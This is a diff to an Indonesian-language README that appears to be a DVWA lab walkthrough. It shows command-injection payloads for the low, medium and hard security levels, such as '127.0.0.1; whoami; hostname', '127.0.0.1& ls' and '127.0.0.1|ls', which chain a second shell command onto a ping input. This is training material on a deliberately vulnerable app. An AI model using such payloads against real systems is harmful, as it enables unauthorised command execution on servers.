@@ -4,7 +4,7 @@ Damn Vulnerable Web Application (DVWA) adalah aplikasi web berbasis PHP/MySQL ya
 Informasi Download dan instalasi: https://github.com/digininja/DVWA
 
 ## Command Injection
-Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua datanya sepenuhnya.
+Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.
 
 ### Security Low
 ```sh
@@ -13,11 +13,22 @@ Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan 
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%201.JPG)
 
 ```sh
-127.0.0.1; cat index.php
+127.0.0.1; whoami; hostname
 ```
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)
 
+### Security Medium
 ```sh
-127.0.0.1; whoami; hostname
+127.0.0.1& ls
 ```
+```sh
+127.0.0.1& whoami& hostname
+```
+
+### Security Hard
+Di level ini kita hanya bisa mengeksekusi 1 perintah saja
+```sh
+127.0.0.1|ls
+```
+
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)
